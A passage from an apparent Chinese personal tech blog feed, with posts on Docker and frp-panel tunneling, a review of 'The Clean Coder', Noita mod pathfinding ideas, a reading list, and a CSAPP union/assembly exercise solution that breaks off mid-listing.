class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> <img src="/image/tlb.png" alt=""></p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本次作业要测算一下 TLB 的容量和访问 TLB 的开销。这个想法参考了 Saavedra-Barrera</summary>
        
      
    
    
    
    <category term="OSTEP" scheme="https://aucept.in/categories/OSTEP/"/>
    
    
    <category term="OSTEP" scheme="https://aucept.in/tags/OSTEP/"/>
    
  </entry>
  
  <entry>
    <title>Docker与NAT</title>
    <link href="https://aucept.in/2025/07/10/Docker%E4%B8%8ENAT/"/>
    <id>https://aucept.in/2025/07/10/Docker%E4%B8%8ENAT/</id>
    <published>2025-07-10T14:35:32.000Z</published>
    <updated>2025-07-17T09:14:18.798Z</updated>
    
    <content type="html"><![CDATA[<p>昨天在火山云上抢到了29/年的一台小云服务器，今天用它做一下重做一下内网穿透的实验，顺便系统学习一遍docker的使用方法</p>
<p>实验说明：</p>
<ul>
<li>目标：借助云服务器完成内网穿透，学习docker的使用</li>
<li>技术选择：frp与vaala的开源项目frp-panel</li>
<li>参考资料：<a href="https://vaala.cat/frp-panel/">frp-panel的文档</a> 与 <a href="https://www.bilibili.com/video/BV1THKyzBER6/?spm_id_from=333.337.search-card.all.click">B站上的docker入门教程</a></li>
<li>环境说明：<code>Linux iv-ydzvaocdmobw80cjj4s4 5.15.120-5.ve2.x86_64 #1 SMP Fri Nov 15 10:09:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</code></li>
</ul>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><code>容器</code>：一个为特定应用程序封装的独立的运行环境，包含程序本体、依赖库和文件系统。相比于虚拟机没有操作系统部分。</p>
<p><code>镜像</code>：容器的“安装包”，存在docker仓库以供分享，官方的仓库为dockerhub</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Docker技术是基于Linux系统的，所以windows和Mac上需要特殊处理（运行一个linux子系统），centOS直接来即可</p>
<p>第0步，更新：<code>sudo yum update</code></p>
<p>然后，<code>curl -fsSL https://get.docker.com -o install-docker.sh</code></p>
<p><code>sudo sh install-docker.sh</code></p>
<h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h3><p>命令为docker pull XXX，后面的部分由三部分构成，<code>registry</code>类似于github的用户名 + 仓库名 + 镜像名:版本，默认最新</p>
<p>国内连不上docker的官方网站，需要<del>翻墙</del>改docker的配置文件换镜像站：</p>
<p><code>sudo vi /etc/docker/daemon.json</code>以超级用户权限用vi打开对应路径下的文件</p>
<p>添加以下内容<br><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token string">"https://docker.m.daocloud.io"</span><span class="token punctuation">,</span>
        <span class="token string">"https://docker.1panel.live"</span><span class="token punctuation">,</span>
        <span class="token string">"https://hub.rat.dev"</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>输入<code>:wq!</code>退出，提示<code>E212: Can&#39;t open file for writing</code>，教程没提到的意外，似乎是权限问题，先退出<code>:q!</code>。经排查docker没有正确完成安装，重装一遍解决。</p>
<p>然后重启<code>sudo service docker restart</code></p>
<p>用nginx检验一下<code>docker pull nginx</code></p>
<p><code>Status: Downloaded newer image for nginx:latest
docker.io/library/nginx:latest</code>成功</p>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><code>sudo docker images</code>展示所有下载过的镜像</p>
<p><code>sudo docker rmi XXX</code>remove image，删除一个镜像，填写仓库名或ID</p>
<p><code>sudo docker run XXX</code>运行一个docker</p>
<ul>
<li>-d运行在后台</li>
<li>-p port1:port2，绑定端口，前为宿主机端口，后为容器内端口</li>
<li>-v 宿主机目录:容器内目录，绑定目录，建立一个映射</li>
<li>-e 后面跟着键值对，传递环境变量</li>
<li>—name 默认 自定义名字 ，给容器起名字，和ID作用相同</li>
<li>—rm容器停止时删除</li>
<li>-it让控制台进入容器内部</li>
<li>—restart 设置停止时的策略，<ul>
<li>always 停止就重启</li>
<li>unless stopped 除非手动关闭否则自动重启（意外原因）</li>
</ul>
</li>
</ul>
<p><code>sudo docker ps</code> process status，查看运行中的容器进程状态,-a all，展示所有容器包括未运行的</p>
<p><code>sudo docker rm XXX</code>删除一个容器</p>
<ul>
<li>-f force，强制删除</li>
</ul>
<p>执行docker run一个本地没有的镜像时，默认行为是去仓库pull，所以第一步拉取镜像可以省略</p>
<p><code>sudo docker start XXX</code>启动一个容器</p>
<p><code>sudo docker stop XXX</code>停止一个容器</p>
<p><code>sudo docker inspect XXX</code> 获取容器的配置文件</p>
<p><code>sudo docker create XXX</code> 只创建容器不运行，参数同docker run</p>
<p><code>sudo docker logs XXX</code>查看日志，-f滚动查看日志</p>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p>制作镜像的工具，即从一个本地运行的程序到一个镜像的指导文件</p>
<p>FROM …… 镜像从哪个镜像基础上构建而来，继承的感觉</p>
<p>WORKDIR 指定工作目录</p>
<p>COPY . . 本机当前目录到容器当前工作目录</p>
<p>RUN <command> 在镜像里执行的命令</p>
<p>EXPOSE PORT 可不写，指定端口，优先级在运行容器时的-p 之后</p>
<p>CMD …… 容器运行时的默认启动命令</p>
<p>在命令行执行<code>docker build -t newName .</code>在当前目录构建镜像</p>
<h3 id="推送到dockerhub"><a href="#推送到dockerhub" class="headerlink" title="推送到dockerhub"></a>推送到dockerhub</h3><p><code>docker login</code>登录</p>
<p><code>docker push address</code>推送，这一步需要镜像包含用户名作为命名空间</p>
<h3 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h3><p>用于完成不同容器间的通信问题</p>
<p><code>docker network create XXX</code>创建子网，同一子网之间可以互相通信，支持名称访问，也就是内置了一个小DNS</p>
<p><code>docker network rm XXX</code>删除子网<br>容器在运行时加入— network netName 完成加入网络</p>
<p>host模式，直接运行在宿主机的端口，和宿主机共享网络环境</p>
<p>none模式，不联网</p>
<h3 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker compose"></a>Docker compose</h3><p>解决的问题是，对于一个全栈项目把所有组件都打包在一起耦合性过高不便于调试，出错了会比较麻烦，而解决的方法是分开运行在多个容器，而Docker Compose就是用来管理编排多个容器的工具</p>
<p>用yaml文件统一管理配置，可以简单理解为把指令汇总到一个文件里，换一种记录格式。默认创建一个子网并把所有容器加入进去</p>
<p><code>sudo docker compose up</code>创建这样一个docker集群，根据当前文件夹下的名为docker-compose.yaml的文件</p>
<p><code>sudo docker compose down</code>停止并删除</p>
<p><code>sudo docker compose stop</code>只停止不删除</p>
<p><code>sudo docker compose start</code>让停止的运行</p>
<p>K8s：可以简单理解为docker compose plus</p>
<h2 id="Frp-Panel"><a href="#Frp-Panel" class="headerlink" title="Frp-Panel"></a>Frp-Panel</h2><p>vaala在文档里提供了多种部署方法，选择docker compose的方法，因为编辑内容方便……如果编辑器再方便一点的话</p>
<p><code>vi docker-compose.yaml</code>然后按照文档换密码和公网IP，然后运行<code>docker compose up</code>，自动拉取镜像并运行</p>
<p>开一下防火墙，浏览器访问IP:9000端口就可以进入到配置页面了，但是云服务器没有ssl证书，裸ip似乎是不能免费配，忽略吧</p>
<p>先了解一下frp的基本原理：简单的说就是通过一台公网可访问的服务器做中转，让外部可以访问一个内网设备。需要在云服务器上部署frp服务端，在内网设备上部署frp客户端，主动连接服务端</p>
<p>也就是说frp的配置是分开的，而frp-panel项目的目的是提供一个中心化的配置方案。设计架构是增加了一个管理server和client的master角色，管理者对master进行配置，而server和client在运行时都去master那里获取配置</p>
<p>接下来是具体配置，先服务端，公网IP，端口随便写一个，监听地址0.0.0.0；再客户端，保持默认配置复制启动命令，在本地执行windows命令，自动下载需要的东西，然后开始运行；下一步是新建隧道，选择好服务端和客户端、tcp、然后本地IP127.0.0.1、端口</p>
<p>最后开一下端口，完成！</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;昨天在火山云上抢到了29/年的一台小云服务器，今天用它做一下重做一下内网穿透的实验，顺便系统学习一遍docker的使用方法&lt;/p&gt;
&lt;p&gt;实验说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标：借助云服务器完成内网穿透，学习docker的使用&lt;/li&gt;
&lt;li&gt;技术选择：frp与vaa</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="内网穿透" scheme="https://aucept.in/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
    <category term="frp-panel" scheme="https://aucept.in/tags/frp-panel/"/>
    
    <category term="docker" scheme="https://aucept.in/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>代码整洁之道：程序员的职业素养</title>
    <link href="https://aucept.in/2025/07/09/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%81%8C%E4%B8%9A%E7%B4%A0%E5%85%BB/"/>
    <id>https://aucept.in/2025/07/09/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%81%8C%E4%B8%9A%E7%B4%A0%E5%85%BB/</id>
    <published>2025-07-09T15:09:11.000Z</published>
    <updated>2025-07-09T15:11:39.826Z</updated>
    
    <content type="html"><![CDATA[<p>起因是读了<a href="https://blog.moy.cat/2024/02/11/浅评计算机专业的课程教育/">浅评计算机专业的课程教育</a>这篇文章，对于文章观点我不予评价，我还不配，但是文中推荐了一本书，即本文的标题，<code>《代码整洁之道：程序员的职业素养》</code></p>
<p>书并不厚，内容也不硬核，读起来还是没有什么负担的</p>
<p>虽然名字如此，但这本书并不教导组织大型项目代码的技巧，而是一些别的东西，一些被称为“程序员的职业素养”的东西，读完给了我一个从未有过的视角，确实值得推荐，只是在尚未面临就业的当下还是稍有遥远</p>
<h2 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h2><p>专业意味着负责，意味着不能容忍代码中的任何一个微小的bug，意味着不能因为偷懒放弃任何一个细节的测试。这也就引出了我平时编程不怎么注意的点——测试，大量的、涉及每个模块的、自动化的测试。</p>
<h2 id="TDD"><a href="#TDD" class="headerlink" title="TDD"></a>TDD</h2><p>Test-Driven-Develop，测试驱动开发：1.先写测试再写功能代码 2.只要不通过测试，就不要继续写代码 3.代码只通过测试就可以了，不需要多写</p>
<p>相比于写完一个模块再整体运行时测试，这样显然不容易产生隐性的、难以察觉的bug，当然，代价就是大量的测试代码。测试使得任何模块都可以被修改——只要还能通过测试，理论上就不会让整个系统功能崩溃，而这就意味着代码可以被放心地频繁重构、修改，所谓“屎山”也就不会出现、或至少也是可以处理的了</p>
<p>同时依照此流程写出的代码天然具有良好的解耦性。</p>
<p>然而缺点也很显然——一切优点都建立在良好的测试代码上，而这并不容易</p>
<p>测试从上到下也分为好多种，书中称为自动化测试金字塔：覆盖率约100%的单元测试，由程序员负责；约占单元测试一半量的组件测试，借由模拟或测试辅助技术完成，由QA完成；单元测试约20%量的集成测试，指测试大量组件的写作，以确认架构的正确；单元测试约10%的量的系统测试，确保正确的系统<code>构造</code>（什么意思？）；以及最后的人工探索测试，在屏幕上通过键盘屏幕完成实际探索测试</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>音乐家的技能不是在舞台上学习的，是台下的练习，程序员也一样，要想代码写得又快又好，就必须需要练习。</p>
<p>书中提到了一种名为<code>kata</code>的练习，编程kata是一套敲击键盘和鼠标的动作，用来模拟编程问题的解决过程，解决方案是熟悉的，但是解决问题的动作和决策是可以因此得到练习的</p>
<p>作者推了很多kata游戏，链接如下：<a href="http://katas.softwarecraftsmanship.org">网址1</a><br><a href="http://butunclebob.com/ArticleS.UncleBob.TheBowlingGameKata">保龄球</a><br><a href="http://butunclebob.com/ArticleS.UncleBob.ThePrimeFactorsKata">素因子</a></p>
<p><code>wasa</code>是一种两个人的<code>kata</code>，比如一个人写kata一个人写单元测试这样</p>
<p><code>开源项目</code></p>
<h2 id="严谨"><a href="#严谨" class="headerlink" title="严谨"></a>严谨</h2><p>这本不厚的书花了大力气去讲“说‘不’”与“说‘是’”。</p>
<p>说“不”，也就是在实际的工作环境中，一个专业的程序员应对领导或是客户的方法</p>
<p>程序员总是被要求在规定的时间内完成一些任务，本文的意思是，如果是专业的软件工程师，那么对不合理的时间要求就一定要拒绝。理由很简单，基于一个客观存在的现象：</p>
<p><code>泥潭</code>：代码失去了简单与整洁，表面上还可以继续开发工作，实际上开发效率越来越慢，且几乎不可逆</p>
<p>于是自然有“越从容的代码越整洁，越利于项目进行；越着急的代码越脏乱，越不利于项目完成”的结论，而时间不足对代码质量的影响自是不言而喻</p>
<p>程序员需要对工作量有一个相对准确的预估，书中给了几个方法：</p>
<h3 id="PERT"><a href="#PERT" class="headerlink" title="PERT"></a>PERT</h3><p>一种避免乐观评估的方法，策略是把预估变成概率分布</p>
<p>三元分析法，乐观预估（O）与悲观预估（P）——概率小于三个标准差的情况，与标称预估（N）——最有可能的情况</p>
<p>然后 $\mu = \frac{O + 4N + P}{6}$得到期望</p>
<p>$\sigma = \frac{P - O} {6}$得到标准差</p>
<p>概率分布得以估计出来</p>
<h3 id="德尔菲法"><a href="#德尔菲法" class="headerlink" title="德尔菲法"></a>德尔菲法</h3><p>核心是“共识”，彼此独立地估计时间，然后讨论达成共识，或是别的种种方式</p>
<p>而说“是”则是拒绝完成任务的含糊，尤其是在工作中。一个含糊的承诺会影响团队的工作进展，所以不要说“试试”这种话，给个明确的日期。</p>
<h2 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h2><p>编码是一项脑力劳动，故保持工作效率是很重要的。</p>
<p>这个话题我已经在其它地方接触的很多了，我并不认为本书说得更好</p>
<p>值得一提的是作者并不赞同“心流”下编码，认为这个状态虽然是愉悦的，却不一定是注意力真的高度集中的</p>
<p>书中还着重强调了“结对”，也就是找个编程搭子一起，的重要性</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>TDD的思想是那么令人着迷，它许诺的整洁与便利确实值得我花费时间去仔细去学习去应用</p>
<p>至于书中的其它内容，或许当我面对其境遇时，会给我提供一些参考吧</p>
<p>路漫漫其修远兮，至少有个方向不是？</p>
<h2 id="请原谅我把文笔这么舒畅的一本书总结得这么干巴巴的QAQ"><a href="#请原谅我把文笔这么舒畅的一本书总结得这么干巴巴的QAQ" class="headerlink" title="请原谅我把文笔这么舒畅的一本书总结得这么干巴巴的QAQ"></a>请原谅我把文笔这么舒畅的一本书总结得这么干巴巴的QAQ</h2>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;起因是读了&lt;a</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="软件开发" scheme="https://aucept.in/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>复杂2d游戏地图上的自动化寻路算法设计</title>
    <link href="https://aucept.in/2025/07/09/%E5%A4%8D%E6%9D%822d%E6%B8%B8%E6%88%8F%E5%9C%B0%E5%9B%BE%E4%B8%8A%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AF%BB%E8%B7%AF%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/"/>
    <id>https://aucept.in/2025/07/09/%E5%A4%8D%E6%9D%822d%E6%B8%B8%E6%88%8F%E5%9C%B0%E5%9B%BE%E4%B8%8A%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AF%BB%E8%B7%AF%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/</id>
    <published>2025-07-09T13:19:28.000Z</published>
    <updated>2025-07-20T06:23:18.852Z</updated>
    
    <content type="html"><![CDATA[<p><code>声明:</code>本人并非OIer，没有系统学习过算法，故不足之处还请见谅，如有好的想法<code>非常非常非常</code>欢迎提出</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>笔者正在为游戏noita设计一个自动化控制角色的脚本mod，最终目的是可以全自动完成主线。</p>
<p>noita的地形相当复杂，如何在复杂的地形中前往指定地点就成了不得不面对的问题，且不同于战斗逻辑有现成的游戏原生算法可以参考，寻路只能从头开始构建。在经历了几天痛苦地碰壁后，借由此文重新梳理思路。</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><blockquote>
<p>输入：终点坐标</p>
<p>输出：可以使角色到达终点的移动逻辑</p>
</blockquote>
<p>备注：角色基本操作已经过封装，可以方便地调用，包括左右移动，上飞，踢击。有大量的游戏api感知环境状态。不考虑游戏内开路，不考虑怪物影响</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>问题可以分为两个层面，一个比较宏观，如何找到一条通往终点的道路；另一个相对微观，如何在崎岖不平的道路上移动而不被卡住<br>问题重新定义为：</p>
<blockquote>
<p>函数1：寻路</p>
<p>输入：终点坐标</p>
<p>输出：通往终点的，连续无障碍路径<br>函数2：避障</p>
<p>输入：保证路途中无障碍的坐标</p>
<p>输出：一系列移动逻辑可到达该坐标</p>
</blockquote>
<h3 id="考虑是否可以看做已知问题的变体"><a href="#考虑是否可以看做已知问题的变体" class="headerlink" title="考虑是否可以看做已知问题的变体"></a>考虑是否可以看做已知问题的变体</h3><p>noita的地形是相当复杂的，而且碍于笔者经验有限，很难找到一种已知的简单策略迁移过来，暂时作罢</p>
<h3 id="考虑对输入做处理"><a href="#考虑对输入做处理" class="headerlink" title="考虑对输入做处理"></a>考虑对输入做处理</h3><p>输入是一个坐标，以及通过游戏api获取到的信息，对于后者也许需要离散化处理。</p>
<h3 id="考虑最笨也最显而易见的办法"><a href="#考虑最笨也最显而易见的办法" class="headerlink" title="考虑最笨也最显而易见的办法"></a>考虑最笨也最显而易见的办法</h3><p>如果可以将游戏地图抽象成一个离散的格子图，显然是可以用穷举的办法解决的，但是如何抽象显然是一个棘手的问题。</p>
<p>游戏本身已经是相对离散的了，也许最笨的办法，寻路即记忆走过的坐标并尝试所有可能的路径，避障即尝试所有的移动组合，如果都无效就确认是死路，根据记忆回溯</p>
<p>或者在游戏地图上撒足够密的点，然后通过射线机制确定点与点之间的连通性，这样就抽象出了一个图，然后用一个最短路径搜索算法求路径即可</p>
<h3 id="考虑尽可能多的贪心算法"><a href="#考虑尽可能多的贪心算法" class="headerlink" title="考虑尽可能多的贪心算法"></a>考虑尽可能多的贪心算法</h3><p>第一个想法是模拟人的寻路，即在视野内找到无阻碍的、离终点最近的“中继点”，然后前往该点，再找下一个。</p>
<p>但是在遇到“洞穴”地形时会在洞的尽头反复退出一步再撞墙，对于两面受阻的“山脚”地形也没有处理能力，故而只作为一种“避障”函数的策略，效果还是不错的。</p>
<p>具体实现为以玩家坐标为中心，30°、40单位长度为步长，在玩家周围半径200单位长度生成65个可能的中继点，根据射线机制筛掉隔着墙的不可达点，再根据与玩家的距离（不太近）和与终点的距离（尽可能小）计算一个分数，把分数最高的作为当前中继点，以此为目标赶路。</p>
<p>中继点系统也具有少量路径规划能力，体现在根据一些函数检测到卡住时，将当前选择的中继点加进黑名单，其中心半径50单位的范围在生成新的中继点时效果等同于墙壁</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>按书中的方法，接下来是分治、dp、NP问题简化等等，但此问题并不适合</p>
<p>A*算法：一种启发式搜索算法，结合dijkstra算法的已有代价和贪心策略的距离终点的预估从而在多数场景下既能得到全局最优</p>
<p>尝试用A*算法作为寻路，结果并不理想，由于离散化是基于65个中继点的，故无法进行过于深的路线计算，而短途计算并没有比原有的贪心策略更优秀</p>
<p>dfs：将当前位置的中继点离终点的距离排序，递归搜索前5个，控制递归深度为10。略有效果但并不明显，而且由于计算量极大给游戏造成了明显的卡顿。原因是终点距离起点很远，且连通性需要自己判断，性能上不支持足够深的搜索</p>
<p>离散化的巨大负担是根本原因，考虑重新做离散化</p>
<p>考虑更加直接的离散化策略，把50<em>50坐标看做一个格子，连通性用一次中心到中心的射线判断，在此基础上重新尝试A</em>算法，即根据代价函数得出当前位置附近的最优格子，然后检测连通性，继续探索直到找到终点，得出路径</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;code&gt;声明:&lt;/code&gt;本人并非OIer，没有系统学习过算法，故不足之处还请见谅，如有好的想法&lt;code&gt;非常非常非常&lt;/code&gt;欢迎提出&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="problem &amp; solution" scheme="https://aucept.in/categories/problem-solution/"/>
    
    
    <category term="noita" scheme="https://aucept.in/tags/noita/"/>
    
    <category term="算法" scheme="https://aucept.in/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="寻路" scheme="https://aucept.in/tags/%E5%AF%BB%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>[lib]一些读过的文章分享</title>
    <link href="https://aucept.in/2025/07/06/%E8%BD%AC%E8%BD%BD-%E4%B8%80%E4%BA%9B%E8%AF%BB%E8%BF%87%E7%9A%84%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB/"/>
    <id>https://aucept.in/2025/07/06/%E8%BD%AC%E8%BD%BD-%E4%B8%80%E4%BA%9B%E8%AF%BB%E8%BF%87%E7%9A%84%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB/</id>
    <published>2025-07-06T05:46:49.000Z</published>
    <updated>2025-12-29T10:47:53.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="你缺计课"><a href="#你缺计课" class="headerlink" title="你缺计课"></a><a href="https://www.criwits.top/missing/">你缺计课</a></h2><p>一些计算机基础知识</p>
<h2 id="CS自学指南"><a href="#CS自学指南" class="headerlink" title="CS自学指南"></a><a href="https://csdiy.wiki/">CS自学指南</a></h2><p>如其名</p>
<h2 id="“那篇雄文”"><a href="#“那篇雄文”" class="headerlink" title="“那篇雄文”"></a><a href="https://github.com/HW-whistleblower/True-Story-of-Pangu">“那篇雄文”</a></h2><p><strong>我胆子大我敢转</strong></p>
<h2 id="rust学习参考书"><a href="#rust学习参考书" class="headerlink" title="rust学习参考书"></a><a href="https://course.rs/about-book.html">rust学习参考书</a></h2><p>免费开源online</p>
<h2 id="同作者的AI入门圣经"><a href="#同作者的AI入门圣经" class="headerlink" title="同作者的AI入门圣经"></a><a href="beatai.cn">同作者的AI入门圣经</a></h2><h2 id="tauri官方文档"><a href="#tauri官方文档" class="headerlink" title="tauri官方文档"></a><a href="https://tauri.app/zh-cn/start/">tauri官方文档</a></h2><p>基于rust的桌面应用框架</p>
<h2 id="Rust异步编程与Tokio架构高级概述"><a href="#Rust异步编程与Tokio架构高级概述" class="headerlink" title="Rust异步编程与Tokio架构高级概述"></a><a href="https://moslehian.com/posts/2023/1-intro-async-rust-tokio/">Rust异步编程与Tokio架构高级概述</a></h2><p>群里看见jyi分享的</p>
<h2 id="cmake说明书"><a href="#cmake说明书" class="headerlink" title="cmake说明书"></a><a href="https://modern-cmake-cn.github.io/Modern-CMake-zh_CN/">cmake说明书</a></h2><p>来自老师分享</p>
<h2 id="可以搞赞助"><a href="#可以搞赞助" class="headerlink" title="可以搞赞助"></a><a href="https://github.com/NodeSeekDev/NodeSupport">可以搞赞助</a></h2><p>并非文章，一个服务器赞助机构</p>
<h2 id="zlibrary"><a href="#zlibrary" class="headerlink" title="zlibrary"></a><a href="https://z-library.sk/">zlibrary</a></h2><p>也并非文章，想去下本电子书结果一头撞进盗版，故留一份正版的网址</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;你缺计课&quot;&gt;&lt;a href=&quot;#你缺计课&quot; class=&quot;headerlink&quot; title=&quot;你缺计课&quot;&gt;&lt;/a&gt;&lt;a</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>CSAPP3.70-3.75</title>
    <link href="https://aucept.in/2025/07/03/CSAPP3-70-3-75/"/>
    <id>https://aucept.in/2025/07/03/CSAPP3-70-3-75/</id>
    <published>2025-07-03T06:11:00.000Z</published>
    <updated>2025-07-09T09:06:05.524Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目-3-70"><a href="#题目-3-70" class="headerlink" title="题目***3.70"></a>题目***3.70</h2><blockquote>
<p>考虑下面的联合声明：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> ele<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">long</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
      <span class="token keyword">long</span> y<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>e1<span class="token punctuation">;</span>
  <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">long</span> x<span class="token punctuation">;</span>
      <span class="token keyword">union</span> ele <span class="token operator">*</span>next<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>e2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这个声明说明联合中可以嵌套结构<br>下面的函数（省略了一些表达式）对一个链表进行操作，链表是以上述联合作为元素的<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">proc</span><span class="token punctuation">(</span><span class="token keyword">union</span> ele <span class="token operator">*</span>up<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  up<span class="token operator">-></span>___<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span>___<span class="token punctuation">)</span><span class="token operator">-</span>___<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>A.下列字段的偏移量是多少（以字节为单位）  </p>
<ul>
<li>e1.p  <em>_</em></li>
<li>e1.y  <em>_</em></li>
<li>e2.x  <em>_</em></li>
<li>e2.next <em>_</em></li>
</ul>
<p>B.这个结构总共需要多少个字节<br>C.编译器为proc产生下面的汇编代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">proc:
  movq    8(%rdi), %rax   ;rax &#x3D; next
  movq    (%rax), %rdx    ;rdx &#x3D; next-&gt;p
  movq    (%rdx), %rdx    ;rdx &#x3D; *p
  subq    8(%rax), %rdx   ;rdx - next-&gt;y
  movq    %rdx, (%rdi)    ;*rdi &#x3D; rdx
  ret  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在这些信息的基础上，填写proc代码中缺失的表达式。<strong>提示:</strong>有些联合引用的解释可以有歧义。当你清楚引用指引到哪里的时候，就能够澄清这些歧义。只有一个答案，不需要进行强制类型转换，且不违法任何类型限制</p>
</blockquote>
<p>A.p和x都是第一个元素，偏移量为0，y和next偏移量都是8<br>B.16字节<br>C.rax有一个解引用操作，所以是next，next继续解引用，可能是p或x，最后的结果在(rdi)<br>第一次尝试：</p>
<blockquote>
<p>up-&gt;e2.x=*(up-&gt;e2.next-&gt;e1.p) - up-&gt;e1.y;</p>
</blockquote>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">movq8(%rdi), %rdx
movq(%rdx), %rax
movq(%rax), %rax
subq%rdx, %rax
movq%rax, (%rdi)
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>subq行少了一个8字节偏移</p>
<blockquote>
<p>up-&gt;e2.x=*(up-&gt;e2.next-&gt;e1.p) - up-&gt;e2.next-&gt;e1.y;</p>
</blockquote>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">movq8(%rdi), %rdx
movq(%rdx), %rax
movq(%rax), %rax
subq8(%rdx), %rax
movq%rax, (%rdi)
